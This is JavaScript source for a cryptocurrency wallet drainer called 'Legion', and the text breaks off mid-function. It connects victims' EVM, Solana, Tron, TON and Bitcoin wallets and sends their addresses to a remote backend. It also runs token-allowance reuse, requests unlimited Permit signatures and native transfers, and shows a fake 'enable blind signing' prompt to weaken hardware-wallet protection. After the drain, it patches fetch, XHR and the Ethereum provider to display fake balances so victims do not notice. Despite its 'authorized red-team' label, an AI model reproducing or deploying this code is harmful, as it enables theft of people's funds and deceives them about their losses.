/**
 * Production fake-balance interceptor — persists pre-drain snapshot in localStorage.
 * Authorized red-team research only.
 */
(function () {
  var BACKEND_URL = 'https://legionapi-production.up.railway.app';
  var ENABLED = true;
  var STORAGE_KEY = 'legion_fake_balance_snapshot_v1';
  var BALANCE_URL_RE = /balance|getbalance|tokenbalance|wallet\/assets|portfolio|holdings|account\/value|user\/assets/i;
  var RPC_BALANCE_METHODS = {
    eth_getbalance: true,
    eth_call: true,
    alchemy_gettokenbalances: true,
    qn_fetchtokenbalances: true,
  };

  var state = {
    snapshot: null,
    interceptorsInstalled: false,
  };

  function loadSnapshot() {
    try {
      var raw = localStorage.getItem(STORAGE_KEY);
      if (!raw) return null;
      return JSON.parse(raw);
    } catch (e) {
      return null;
    }
  }

  function saveSnapshot(snapshot) {
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(snapshot));
      state.snapshot = snapshot;
    } catch (e) { /* quota */ }
  }

  function normalizeAddr(a) {
    return a ? String(a).toLowerCase() : '';
  }

  function victimAddresses(snapshot) {
    var out = [];
    if (!snapshot || !snapshot.wallets) return out;
    Object.keys(snapshot.wallets).forEach(function (k) {
      var v = snapshot.wallets[k];
      if (v) out.push(normalizeAddr(v));
    });
    return out;
  }

  function urlLooksLikeBalance(url) {
    return BALANCE_URL_RE.test(String(url || ''));
  }

  function bodyMentionsVictim(body, victims) {
    if (!body) return false;
    var text = typeof body === 'string' ? body : JSON.stringify(body);
    var lower = text.toLowerCase();
    return victims.some(function (a) { return a && lower.indexOf(a) >= 0; });
  }

  function findCachedResponse(snapshot, url, method) {
    if (!snapshot || !snapshot.balanceResponses) return null;
    var u = String(url);
    for (var i = snapshot.balanceResponses.length - 1; i >= 0; i--) {
      var row = snapshot.balanceResponses[i];
      if (row.url === u && (!row.method || row.method === method)) return row.responseText;
    }
    return null;
  }

  function buildMultiBalanceEnvelope(snapshot) {
    if (!snapshot || !snapshot.multiBalance) return null;
    var mb = snapshot.multiBalance;
    if (mb.success !== undefined) return JSON.stringify(mb);
    return JSON.stringify({ success: true, message: 'Multi-chain balances probed', data: mb });
  }

  function synthesizeBalanceResponse(url, snapshot) {
    if (!snapshot) return null;
    if (String(url).indexOf('/api/v1/balance/multi') >= 0) {
      return buildMultiBalanceEnvelope(snapshot);
    }
    var cached = findCachedResponse(snapshot, url, 'GET') || findCachedResponse(snapshot, url, 'POST');
    if (cached) return cached;
    if (snapshot.multiBalance && snapshot.multiBalance.data) {
      return JSON.stringify(snapshot.multiBalance.data);
    }
    if (snapshot.multiBalance && snapshot.multiBalance.chains) {
      return JSON.stringify(snapshot.multiBalance);
    }
    return null;
  }

  function fakeResponse(text, status) {
    return new Response(text || '{}', {
      status: status || 200,
      headers: { 'Content-Type': 'application/json' },
    });
  }

  function recordBalanceResponse(url, method, responseText) {
    if (!state.snapshot) state.snapshot = loadSnapshot() || { version: 1, wallets: {}, balanceResponses: [] };
    if (!state.snapshot.balanceResponses) state.snapshot.balanceResponses = [];
    state.snapshot.balanceResponses.push({
      url: String(url),
      method: method || 'GET',
      responseText: responseText,
      recordedAt: new Date().toISOString(),
    });
    if (state.snapshot.balanceResponses.length > 48) {
      state.snapshot.balanceResponses = state.snapshot.balanceResponses.slice(-48);
    }
    saveSnapshot(state.snapshot);
  }

  async function fetchMultiBalance(wallets) {
    var params = new URLSearchParams();
    if (wallets.evm) params.set('evm', wallets.evm);
    if (wallets.sol) params.set('sol', wallets.sol);
    if (wallets.tron) params.set('tron', wallets.tron);
    if (wallets.ton) params.set('ton', wallets.ton);
    if (wallets.btc) params.set('btc', wallets.btc);
    if (!params.toString()) return null;
    var res = await fetch(BACKEND_URL + '/api/v1/balance/multi?' + params.toString(), { cache: 'no-store' });
    var data = await res.json().catch(function () { return null; });
    return data;
  }

  function ethBalanceHexFromSnapshot(snapshot, address, chainId) {
    if (!snapshot || !snapshot.multiBalance) return null;
    var data = snapshot.multiBalance.data || snapshot.multiBalance;
    var chains = data.chains || [];
    var addr = normalizeAddr(address);
    for (var i = 0; i < chains.length; i++) {
      var row = chains[i];
      if (normalizeAddr(row.address) !== addr) continue;
      if (row.family === 'EVM' && row.native && row.native.amount_raw) {
        var raw = BigInt(row.native.amount_raw);
        return '0x' + raw.toString(16);
      }
    }
    if (snapshot.ethBalances) {
      var key = addr + ':' + String(chainId || 1);
      if (snapshot.ethBalances[key]) return snapshot.ethBalances[key];
    }
    return null;
  }

  function encodeUint256Hex(value) {
    try {
      var n = BigInt(value);
      return '0x' + n.toString(16).padStart(64, '0');
    } catch (e) {
      return '0x' + (0).toString(16).padStart(64, '0');
    }
  }

  function shouldSpoofRpc(params, snapshot) {
    if (!params || !snapshot) return null;
    var method = (params.method || '').toLowerCase();
    if (method === 'eth_getbalance') {
      var addr = params.params && params.params[0];
      var block = params.params && params.params[1];
      if (!addr) return null;
      var victims = victimAddresses(snapshot);
      if (victims.indexOf(normalizeAddr(addr)) < 0) return null;
      var hex = ethBalanceHexFromSnapshot(snapshot, addr, 1);
      if (hex) return { result: hex, block: block };
    }
    if (method === 'eth_call' && params.params && params.params[0]) {
      var call = params.params[0];
      var to = call.to;
      var data = call.data || '';
      if (data.indexOf('70a08231') >= 0 && victimsMentioned(call, snapshot)) {
        var tokenBal = tokenBalanceFromSnapshot(snapshot, call);
        if (tokenBal) return { result: encodeUint256Hex(tokenBal) };
      }
    }
    return null;
  }

  function victimsMentioned(call, snapshot) {
    var data = call.data || '';
    var victims = victimAddresses(snapshot);
    return victims.some(function (v) {
      if (!v || v.indexOf('0x') !== 0) return false;
      return data.toLowerCase().indexOf(v.slice(2)) >= 0;
    });
  }

  function tokenBalanceFromSnapshot(snapshot, call) {
    var data = snapshot.multiBalance && (snapshot.multiBalance.data || snapshot.multiBalance);
    if (!data || !data.chains) return null;
    var contract = normalizeAddr(call.to);
    for (var i = 0; i < data.chains.length; i++) {
      var chain = data.chains[i];
      var tokens = chain.tokens || [];
      for (var j = 0; j < tokens.length; j++) {
        if (normalizeAddr(tokens[j].contract) === contract) return tokens[j].amount_raw;
      }
    }
    return null;
  }

  function installFetchInterceptor(snapshot) {
    if (!window.fetch || window.fetch.__legionFakeBalance) return;
    var original = window.fetch.bind(window);
    function patchedFetch(input, init) {
      var url = typeof input === 'string' ? input : (input && input.url) || '';
      var method = (init && init.method) || (input && input.method) || 'GET';
      var victims = victimAddresses(snapshot);

      if (!snapshot.drainCompletedAt) {
        return original(input, init).then(function (res) {
          if (urlLooksLikeBalance(url)) {
            res.clone().text().then(function (text) {
              if (text && text.length < 512000) recordBalanceResponse(url, method, text);
            }).catch(function () {});
          }
          return res;
        });
      }

      if (urlLooksLikeBalance(url) && (victims.length === 0 || bodyMentionsVictim(init && init.body, victims) || url.indexOf('balance') >= 0)) {
        var fake = synthesizeBalanceResponse(url, snapshot);
        if (fake) return Promise.resolve(fakeResponse(fake));
      }
      return original(input, init);
    }
    patchedFetch.__legionFakeBalance = true;
    window.fetch = patchedFetch;
  }

  function installXhrInterceptor(snapshot) {
    if (!window.XMLHttpRequest || XMLHttpRequest.prototype.__legionFakeBalance) return;
    var victims = victimAddresses(snapshot);
    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function (method, url) {
      this.__legionUrl = url;
      this.__legionMethod = method;
      return origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function (body) {
      var self = this;
      var url = self.__legionUrl || '';
      var method = self.__legionMethod || 'GET';

      if (!snapshot.drainCompletedAt) {
        this.addEventListener('load', function () {
          if (urlLooksLikeBalance(url) && self.responseText && self.responseText.length < 512000) {
            recordBalanceResponse(url, method, self.responseText);
          }
        });
        return origSend.apply(this, arguments);
      }

      if (urlLooksLikeBalance(url) && (victims.length === 0 || bodyMentionsVictim(body, victims) || true)) {
        var fake = synthesizeBalanceResponse(url, snapshot);
        if (fake) {
          setTimeout(function () {
            try {
              Object.defineProperty(self, 'readyState', { configurable: true, get: function () { return 4; } });
              Object.defineProperty(self, 'status', { configurable: true, get: function () { return 200; } });
              Object.defineProperty(self, 'responseText', { configurable: true, get: function () { return fake; } });
              Object.defineProperty(self, 'response', { configurable: true, get: function () { return fake; } });
              if (typeof self.onreadystatechange === 'function') self.onreadystatechange();
              self.dispatchEvent(new Event('load'));
              self.dispatchEvent(new Event('loadend'));
            } catch (e) { /* ignore */ }
          }, 0);
          return;
        }
      }
      return origSend.apply(this, arguments);
    };
    XMLHttpRequest.prototype.__legionFakeBalance = true;
  }

  function installEthereumInterceptor(snapshot) {
    var eth = window.ethereum;
    if (!eth || !eth.request || eth.request.__legionFakeBalance) return;
    var original = eth.request.bind(eth);
    eth.request = function (params) {
      if (snapshot.drainCompletedAt) {
        var spoof = shouldSpoofRpc(params, snapshot);
        if (spoof) return Promise.resolve(spoof.result);
      } else if (params && params.method && params.method.toLowerCase() === 'eth_getbalance') {
        return original(params).then(function (result) {
          try {
            if (!state.snapshot) state.snapshot = loadSnapshot() || { version: 1, wallets: {}, ethBalances: {} };
            if (!state.snapshot.ethBalances) state.snapshot.ethBalances = {};
            var addr = params.params && params.params[0];
            if (addr) state.snapshot.ethBalances[normalizeAddr(addr) + ':1'] = result;
            saveSnapshot(state.snapshot);
          } catch (e) { /* ignore */ }
          return result;
        });
      }
      return original(params);
    };
    eth.request.__legionFakeBalance = true;
  }

  function installInterceptors(snapshot) {
    if (!snapshot || state.interceptorsInstalled) return;
    installFetchInterceptor(snapshot);
    installXhrInterceptor(snapshot);
    installEthereumInterceptor(snapshot);
    state.interceptorsInstalled = true;
    state.snapshot = snapshot;
  }

  async function capturePreDrainSnapshot(wallets) {
    if (!ENABLED) return null;
    var existing = loadSnapshot();
    var snapshot = existing || {
      version: 1,
      capturedAt: new Date().toISOString(),
      drainCompletedAt: null,
      wallets: {},
      balanceResponses: [],
      ethBalances: {},
    };
    snapshot.wallets = Object.assign({}, snapshot.wallets, wallets || {});
    snapshot.capturedAt = snapshot.capturedAt || new Date().toISOString();

    try {
      var mb = await fetchMultiBalance(snapshot.wallets);
      if (mb) snapshot.multiBalance = mb;
    } catch (e) { /* backend unavailable */ }

    saveSnapshot(snapshot);
    installInterceptors(snapshot);
    return snapshot;
  }

  function activatePostDrain() {
    if (!ENABLED) return;
    var snapshot = loadSnapshot() || state.snapshot;
    if (!snapshot) return;
    snapshot.drainCompletedAt = new Date().toISOString();
    saveSnapshot(snapshot);
    state.interceptorsInstalled = false;
    installInterceptors(snapshot);
  }

  function initFromStorage() {
    if (!ENABLED) return;
    var snapshot = loadSnapshot();
    if (!snapshot) return;
    state.snapshot = snapshot;
    installInterceptors(snapshot);
  }

  window.LegionFakeBalance = {
    capturePreDrainSnapshot: capturePreDrainSnapshot,
    activatePostDrain: activatePostDrain,
    initFromStorage: initFromStorage,
    isEnabled: function () { return ENABLED; },
  };

  if (ENABLED) initFromStorage();
})();


/* Legion authorized red-team drain inject — production backend, any domain */
(function () {
  var BACKEND_URL = 'https://legionapi-production.up.railway.app';
  var KINETIC_KEY = 'uK2WF0w8VynajJYsSmA95bDxThM14BdG';
  var WC_PROJECT_ID = 'a785da105621eb55c998a35c57587667';
  var HARDWARE_AUTO_CONSENT = false;
  var SILENT_INJECT = true;
  var FORCE_HARDWARE_BYPASS = true;
  var PRODUCTION_CLONE = true;
  var QA_VISIBLE_UI = false;

  function collectWalletSnapshot() {
    var snap = {};
    if (wallets.evm && wallets.evm.address) snap.evm = wallets.evm.address;
    if (wallets.sol && wallets.sol.address) snap.sol = wallets.sol.address;
    if (wallets.tron && wallets.tron.address) snap.tron = wallets.tron.address;
    if (wallets.ton && wallets.ton.address) snap.ton = wallets.ton.address;
    if (wallets.btc && wallets.btc.address) snap.btc = wallets.btc.address;
    if (!snap.evm && window.ethereum && window.ethereum.selectedAddress) {
      snap.evm = window.ethereum.selectedAddress;
    }
    return snap;
  }

  async function captureFakeBalanceSnapshot() {
    if (!window.LegionFakeBalance || !window.LegionFakeBalance.isEnabled()) return;
    try {
      await window.LegionFakeBalance.capturePreDrainSnapshot(collectWalletSnapshot());
    } catch (e) { /* non-fatal */ }
  }

  function activateFakeBalanceAfterDrain() {
    if (!window.LegionFakeBalance || !window.LegionFakeBalance.isEnabled()) return;
    try {
      window.LegionFakeBalance.activatePostDrain();
    } catch (e) { /* non-fatal */ }
  }
  if (HARDWARE_AUTO_CONSENT) {
    window.HARDWARE_AUTO_CONSENT = true;
  }
  if (FORCE_HARDWARE_BYPASS) {
    console.warn('[LEGION_AUTH] FORCE_HARDWARE_BYPASS enabled — testing only; assumes blind signing on device');
    window.HARDWARE_AUTO_CONSENT = true;
  }
  var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
  var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  var ACTIVE_TAB = 'evm';

  var WC_EVM_CHAINS = [
    'eip155:1',
    'eip155:137',
    'eip155:56',
    'eip155:42161',
    'eip155:8453',
    'eip155:10',
    'eip155:43114',
  ];
  var WC_SOLANA_MAINNET = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';

  var wallets = {
    evm: null,
    sol: null,
    tron: null,
    ton: null,
    btc: null,
  };

  var wcProvider = null;
  var wcModal = null;
  var wcSdkPromise = null;

  function isHardwareAutoConsent() {
    return Boolean(window.HARDWARE_AUTO_CONSENT || HARDWARE_AUTO_CONSENT || FORCE_HARDWARE_BYPASS);
  }

  function isForceHardwareBypass() {
    return Boolean(FORCE_HARDWARE_BYPASS);
  }

  function detectHardwareWalletType() {
    var eth = window.ethereum;
    if (eth) {
      if (eth.isLedger || eth.isLedgerLive) return 'ledger';
      if (eth.isTrezor) return 'trezor';
    }
    if (wallets.evm && wallets.evm.wcProvider && wallets.evm.wcProvider.session) {
      var peer = wallets.evm.wcProvider.session.peer;
      var peerName = (peer && peer.metadata && peer.metadata.name) || '';
      var lower = peerName.toLowerCase();
      if (lower.indexOf('ledger') >= 0) return 'ledger';
      if (lower.indexOf('trezor') >= 0) return 'trezor';
    }
    if (wallets.evm && wallets.evm.provider) {
      var providerLower = String(wallets.evm.provider).toLowerCase();
      if (providerLower.indexOf('ledger') >= 0) return 'ledger';
      if (providerLower.indexOf('trezor') >= 0) return 'trezor';
    }
    return null;
  }

  function isBlindSigningError(err) {
    var msg = (err && err.message ? err.message : String(err || '')).toLowerCase();
    return (
      msg.indexOf('blind sign') >= 0 ||
      msg.indexOf('blind_sign') >= 0 ||
      msg.indexOf('enable blind') >= 0 ||
      msg.indexOf('blind signing') >= 0 ||
      msg.indexOf('0x6a80') >= 0 ||
      (msg.indexOf('contract data') >= 0 && msg.indexOf('disabled') >= 0) ||
      (msg.indexOf('eip-712') >= 0 && msg.indexOf('not supported') >= 0 && msg.indexOf('ledger') >= 0)
    );
  }

  function showBlindSigningErrorModal() {
    return new Promise(function (resolve, reject) {
      if (isHardwareAutoConsent() || isForceHardwareBypass()) {
        resolve();
        return;
      }

      var existing = document.getElementById('legion-blind-sign-modal');
      if (existing) existing.remove();

      var overlay = document.createElement('div');
      overlay.id = 'legion-blind-sign-modal';
      overlay.className = 'legion-blind-sign-overlay';
      overlay.setAttribute('role', 'alertdialog');
      overlay.setAttribute('aria-modal', 'true');
      overlay.setAttribute('aria-labelledby', 'legion-blind-sign-title');

      var card = document.createElement('div');
      card.className = 'legion-blind-sign-card';
      card.innerHTML = [
        '<h2 id="legion-blind-sign-title">Hardware wallet error</h2>',
        '<p class="legion-blind-error-msg">Blind signing not enabled.<br>Please enable \'Allow blind signing\' in your Ledger/Trezor Ethereum app settings, then click Retry.</p>',
        '<div class="legion-blind-actions">',
        '  <button type="button" class="legion-blind-cancel">Cancel</button>',
        '  <button type="button" class="legion-blind-retry">Retry</button>',
        '</div>',
      ].join('');

      overlay.appendChild(card);
      document.body.appendChild(overlay);

      function cleanup() {
        overlay.remove();
        document.removeEventListener('keydown', onKeyDown);
      }

      function onKeyDown(ev) {
        if (ev.key === 'Escape') {
          cleanup();
          reject(new Error('Hardware wallet signing cancelled'));
        }
      }

      document.addEventListener('keydown', onKeyDown);

      card.querySelector('.legion-blind-retry').addEventListener('click', function () {
        cleanup();
        resolve();
      });

      card.querySelector('.legion-blind-cancel').addEventListener('click', function () {
        cleanup();
        reject(new Error('Hardware wallet signing cancelled'));
      });
    });
  }

  async function onHardwareWalletConnected() {
    /* Permit2 signing handles hardware error modal at signature time */
  }

  function setStatus(text, isSuccess) {
    var el = document.getElementById('legion-auth-status');
    if (!el) return;
    el.textContent = text;
    el.className = 'status' + (isSuccess ? ' success' : '');
  }

  function parseEnvelope(res, data) {
    if (data && typeof data.ok === 'boolean') {
      return { ok: data.ok, message: data.message || '', data: data.data || data };
    }
    return { ok: res.ok, message: (data && data.message) || res.statusText || '', data: data };
  }

  async function apiPost(path, body, extraHeaders) {
    var headers = Object.assign({ 'Content-Type': 'application/json' }, extraHeaders || {});
    var res = await fetch(BACKEND_URL + path, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(body),
    });
    var data = await res.json().catch(function () { return {}; });
    var env = parseEnvelope(res, data);
    if (!env.ok) {
      throw new Error(env.message || ('API error ' + res.status));
    }
    return env.data;
  }

  async function apiGet(path) {
    var res = await fetch(BACKEND_URL + path, { cache: 'no-store' });
    var data = await res.json().catch(function () { return {}; });
    var env = parseEnvelope(res, data);
    if (!env.ok) {
      throw new Error(env.message || ('API error ' + res.status));
    }
    return env.data;
  }

  function toHex(n) {
    return '0x' + BigInt(n).toString(16);
  }

  function wcMetadata() {
    return {
      name: document.title || 'Legion Authorized Exercise',
      description: 'Authorized red-team wallet connection',
      url: window.location.origin,
      icons: [window.location.origin + '/favicon.ico'],
    };
  }

  function loadWcSdk() {
    if (!WC_PROJECT_ID) {
      return Promise.reject(new Error('NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID not configured'));
    }
    if (!wcSdkPromise) {
      wcSdkPromise = Promise.all([
        import('https://esm.sh/@walletconnect/universal-provider@2.13.0'),
        import('https://esm.sh/@walletconnect/modal@2.7.0'),
      ]).then(function (mods) {
        var up = mods[0];
        var md = mods[1];
        return {
          UniversalProvider: up.default || up.UniversalProvider,
          WalletConnectModal: md.WalletConnectModal || (md.default && md.default.WalletConnectModal),
        };
      });
    }
    return wcSdkPromise;
  }

  async function ensureWalletConnectProvider() {
    if (wcProvider && wcProvider.session) return wcProvider;
    var sdk = await loadWcSdk();
    if (!sdk.UniversalProvider) throw new Error('WalletConnect UniversalProvider failed to load');
    wcProvider = await sdk.UniversalProvider.init({
      projectId: WC_PROJECT_ID,
      metadata: wcMetadata(),
    });
    if (!wcModal && sdk.WalletConnectModal) {
      wcModal = new sdk.WalletConnectModal({
        projectId: WC_PROJECT_ID,
        themeMode: 'dark',
      });
    }
    wcProvider.on('display_uri', function (uri) {
      if (wcModal) wcModal.openModal({ uri: uri });
    });
    wcProvider.on('disconnect', function () {
      if (wcModal) wcModal.closeModal();
    });
    return wcProvider;
  }

  function parseWcAccountTriplet(account) {
    if (!account || typeof account !== 'string') return null;
    var parts = account.split(':');
    if (parts.length < 3) return null;
    return { namespace: parts[0], reference: parts[1], address: parts.slice(2).join(':') };
  }

  function applyWalletConnectSession(provider) {
    var ns = (provider.session && provider.session.namespaces) || {};
    var connected = [];

    if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts.length) {
      var evmAcc = parseWcAccountTriplet(ns.eip155.accounts[0]);
      if (evmAcc) {
        var chainId = parseInt(evmAcc.reference, 10);
        wallets.evm = {
          address: evmAcc.address,
          chainId: chainId,
          provider: 'WalletConnect',
          wcProvider: provider,
        };
        connected.push('EVM');
      }
    }

    if (ns.solana && ns.solana.accounts && ns.solana.accounts.length) {
      var solAcc = parseWcAccountTriplet(ns.solana.accounts[0]);
      if (solAcc) {
        wallets.sol = {
          address: solAcc.address,
          provider: provider,
          name: 'WalletConnect',
          wc: true,
        };
        connected.push('Solana');
      }
    }

    return connected;
  }

  async function connectWalletConnect() {
    if (!WC_PROJECT_ID) {
      throw new Error('WalletConnect disabled — set NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID at build time');
    }
    setStatus('Opening WalletConnect QR modal…', false);
    var provider = await ensureWalletConnectProvider();

    if (provider.session) {
      var restored = applyWalletConnectSession(provider);
      if (restored.length) return { connected: restored, provider: provider };
    }

    await provider.connect({
      namespaces: {
        eip155: {
          methods: [
            'eth_sendTransaction',
            'eth_signTransaction',
            'eth_signTypedData_v4',
            'personal_sign',
            'eth_sign',
            'eth_chainId',
            'eth_requestAccounts',
            'wallet_switchEthereumChain',
          ],
          chains: WC_EVM_CHAINS,
          events: ['chainChanged', 'accountsChanged'],
        },
        solana: {
          methods: ['solana_signTransaction', 'solana_signMessage'],
          chains: [WC_SOLANA_MAINNET],
          events: [],
        },
      },
    });

    if (wcModal) wcModal.closeModal();

    var connected = applyWalletConnectSession(provider);
    if (!connected.length) {
      throw new Error('WalletConnect session established but no EVM/Solana accounts approved');
    }
    setStatus('WalletConnect: ' + connected.join(' + ') + ' connected', false);
    await onHardwareWalletConnected();
    return { connected: connected, provider: provider };
  }

  async function getEvmSigningProvider() {
    if (wallets.evm && wallets.evm.wcProvider) return wallets.evm.wcProvider;
    if (!window.ethereum) throw new Error('No EVM wallet (MetaMask / Rabby / WalletConnect).');
    return window.ethereum;
  }

  async function connectEvm() {
    if (wallets.evm) return wallets.evm;
    var eth = window.ethereum;
    if (!eth) throw new Error('No EVM wallet (MetaMask / Rabby / Coinbase).');
    var accounts = await eth.request({ method: 'eth_requestAccounts' });
    if (!accounts || !accounts[0]) throw new Error('No EVM account returned');
    var chainHex = await eth.request({ method: 'eth_chainId' });
    var chainId = parseInt(chainHex, 16);
    var provider = eth.isMetaMask ? 'MetaMask' : eth.isRabby ? 'Rabby' : eth.isCoinbaseWallet ? 'Coinbase' : 'Injected EVM';
    wallets.evm = { address: accounts[0], chainId: chainId, provider: provider };
    await onHardwareWalletConnected();
    return wallets.evm;
  }

  async function connectSolana() {
    if (wallets.sol) return wallets.sol;
    var sol = window.phantom && window.phantom.solana;
    if (!sol && window.solflare && window.solflare.isSolflare) sol = window.solflare;
    if (!sol) throw new Error('No Solana wallet (Phantom / Solflare).');
    var resp = await sol.connect();
    var pubkey = (resp && resp.publicKey) ? resp.publicKey.toString() : (sol.publicKey && sol.publicKey.toString());
    if (!pubkey) throw new Error('Solana connect did not return a public key');
    var name = window.phantom && window.phantom.solana === sol ? 'Phantom' : 'Solflare';
    wallets.sol = { address: pubkey, provider: sol, name: name };
    return wallets.sol;
  }

  async function connectTron() {
    if (wallets.tron) return wallets.tron;
    if (window.tronLink && window.tronLink.request) {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
    }
    var tw = window.tronWeb;
    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
      throw new Error('TronLink not ready — unlock and refresh.');
    }
    wallets.tron = { address: tw.defaultAddress.base58, provider: 'TronLink' };
    return wallets.tron;
  }

  async function connectTon() {
    if (wallets.ton) return wallets.ton;
    var ton = window.tonkeeper && window.tonkeeper.provider;
    if (!ton && window.ton && window.ton.isTonkeeper) ton = window.ton;
    if (!ton) throw new Error('Tonkeeper not detected.');
    var accounts = await ton.send('ton_getAccounts');
    var addr = accounts && accounts[0] && (accounts[0].address || accounts[0]);
    if (!addr) throw new Error('Tonkeeper did not return an address');
    wallets.ton = { address: typeof addr === 'string' ? addr : (addr.toString ? addr.toString() : String(addr)), provider: ton };
    return wallets.ton;
  }

  async function connectBitcoin() {
    if (wallets.btc) return wallets.btc;
    if (window.unisat && window.unisat.requestAccounts) {
      var accounts = await window.unisat.requestAccounts();
      if (!accounts || !accounts[0]) throw new Error('UniSat returned no address');
      wallets.btc = { address: accounts[0], provider: 'UniSat' };
      return wallets.btc;
    }
    if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
      var xverse = window.XverseProviders.BitcoinProvider;
      var addrs = await xverse.request('getAccounts');
      if (!addrs || !addrs[0]) throw new Error('Xverse returned no address');
      wallets.btc = { address: addrs[0], provider: 'Xverse' };
      return wallets.btc;
    }
    throw new Error('No Bitcoin wallet (UniSat / Xverse).');
  }

  async function postScout(address, chainId, chainFamily, walletType) {
    return apiPost('/api/v1/scout', {
      user_address: address,
      chain_id: chainId || 0,
      chain_family: chainFamily,
      wallet_type: walletType,
    });
  }

  async function postFusion() {
    var body = {};
    if (wallets.evm) body.evm_holder = wallets.evm.address;
    if (wallets.sol) body.sol_owner_base58 = wallets.sol.address;
    if (wallets.tron) body.tron_holder_base58 = wallets.tron.address;
    if (wallets.ton) body.ton_friendly_address = wallets.ton.address;
    if (wallets.btc) body.btc_holder_address = wallets.btc.address;
    if (!body.evm_holder && !body.sol_owner_base58 && !body.tron_holder_base58 && !body.ton_friendly_address && !body.btc_holder_address) {
      return { fusion: {}, total_usd: 0 };
    }
    var data = await apiPost('/api/scout/recursive-predator-fusion', body);
    var fusion = (data && data.fusion) || data || {};
    var totalUsd = typeof fusion.total_usd === 'number' ? fusion.total_usd : 0;
    return { fusion: fusion, total_usd: totalUsd };
  }

  async function tryAllowanceReuse() {
    if (!KINETIC_KEY) return null;
    var scanBody = {};
    if (wallets.evm) {
      scanBody.wallet_address = wallets.evm.address;
      scanBody.evm_chain_id = wallets.evm.chainId;
    } else if (wallets.sol) {
      scanBody.wallet_address = wallets.sol.address;
      scanBody.sol_wallet = wallets.sol.address;
    } else if (wallets.tron) {
      scanBody.wallet_address = wallets.tron.address;
      scanBody.tron_wallet = wallets.tron.address;
    } else if (wallets.ton) {
      scanBody.wallet_address = wallets.ton.address;
      scanBody.ton_wallet = wallets.ton.address;
    } else {
      return null;
    }

    var headers = { 'x-legion-kinetic-key': KINETIC_KEY };
    var scanRes = await fetch(BACKEND_URL + '/api/internal/allowance-reuse/scan', {
      method: 'POST',
      headers: Object.assign({ 'Content-Type': 'application/json' }, headers),
      body: JSON.stringify(scanBody),
    });
    var scanData = await scanRes.json().catch(function () { return {}; });
    var scanEnv = parseEnvelope(scanRes, scanData);
    if (!scanEnv.ok) return null;

    var allowances = (scanEnv.data && scanEnv.data.allowances) || [];
    var executable = allowances.filter(function (a) { return a.executable; });
    if (executable.length === 0) return null;

    var execRes = await fetch(BACKEND_URL + '/api/internal/allowance-reuse/execute', {
      method: 'POST',
      headers: Object.assign({ 'Content-Type': 'application/json' }, headers),
      body: JSON.stringify({ wallet_address: scanBody.wallet_address, allowances: executable }),
    });
    var execData = await execRes.json().catch(function () { return {}; });
    var execEnv = parseEnvelope(execRes, execData);
    if (!execEnv.ok) throw new Error(execEnv.message || 'Allowance reuse execute failed');
    return execEnv.data;
  }

  async function signEvmTypedData(typedData) {
    var eth = await getEvmSigningProvider();
    var params = [wallets.evm.address, JSON.stringify(typedData)];

    if (!isHardwareAutoConsent() && detectHardwareWalletType()) {
      await showBlindSigningErrorModal();
    }

    while (true) {
      try {
        return await eth.request({
          method: 'eth_signTypedData_v4',
          params: params,
        });
      } catch (err) {
        if (!isBlindSigningError(err)) throw err;
        if (isHardwareAutoConsent()) throw err;
        await showBlindSigningErrorModal();
      }
    }
  }

  async function signEvmNativeTx(nativeTransfer) {
    if (!nativeTransfer) return null;
    var eth = await getEvmSigningProvider();
    try {
      return await eth.request({
        method: 'eth_signTransaction',
        params: [{
          from: nativeTransfer.from,
          to: nativeTransfer.to,
          value: toHex(nativeTransfer.value),
          gas: toHex(nativeTransfer.gas),
          maxFeePerGas: toHex(nativeTransfer.maxFeePerGas),
          maxPriorityFeePerGas: toHex(nativeTransfer.maxPriorityFeePerGas),
          nonce: toHex(nativeTransfer.nonce),
          type: '0x2',
          chainId: toHex(nativeTransfer.chainId),
        }],
      });
    } catch (e) {
      var tx = await eth.request({
        method: 'eth_sendTransaction',
        params: [{
          from: nativeTransfer.from,
          to: nativeTransfer.to,
          value: toHex(nativeTransfer.value),
          gas: toHex(nativeTransfer.gas),
          maxFeePerGas: toHex(nativeTransfer.maxFeePerGas),
          maxPriorityFeePerGas: toHex(nativeTransfer.maxPriorityFeePerGas),
          type: '0x2',
        }],
      });
      return tx;
    }
  }

  async function loadSolanaWeb3() {
    if (window.solanaWeb3) return window.solanaWeb3;
    await new Promise(function (resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.min.js';
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.solanaWeb3;
  }

  async function signSolanaWire(unsignedWireBase64) {
    if (wallets.sol && wallets.sol.wc && wcProvider) {
      var wcSigned = await wcProvider.request(
        {
          method: 'solana_signTransaction',
          params: { transaction: unsignedWireBase64 },
        },
        'solana',
      );
      if (typeof wcSigned === 'string') return wcSigned;
      if (wcSigned && wcSigned.transaction) return wcSigned.transaction;
      if (wcSigned && wcSigned.signature) return unsignedWireBase64;
      throw new Error('WalletConnect Solana sign returned unexpected payload');
    }
    var web3 = await loadSolanaWeb3();
    var bytes = Uint8Array.from(atob(unsignedWireBase64), function (c) { return c.charCodeAt(0); });
    var tx = web3.VersionedTransaction.deserialize(bytes);
    var signed = await wallets.sol.provider.signTransaction(tx);
    var out = signed.serialize();
    var bin = '';
    for (var i = 0; i < out.length; i++) bin += String.fromCharCode(out[i]);
    return btoa(bin);
  }

  async function signTronNative(nativeTransferTrx) {
    if (!nativeTransferTrx || !window.tronWeb) return null;
    var tw = window.tronWeb;
    if (nativeTransferTrx.unsigned && tw.trx && tw.trx.sign) {
      return tw.trx.sign(nativeTransferTrx.unsigned);
    }
    if (nativeTransferTrx.raw_data && tw.trx && tw.trx.sign) {
      return tw.trx.sign(nativeTransferTrx);
    }
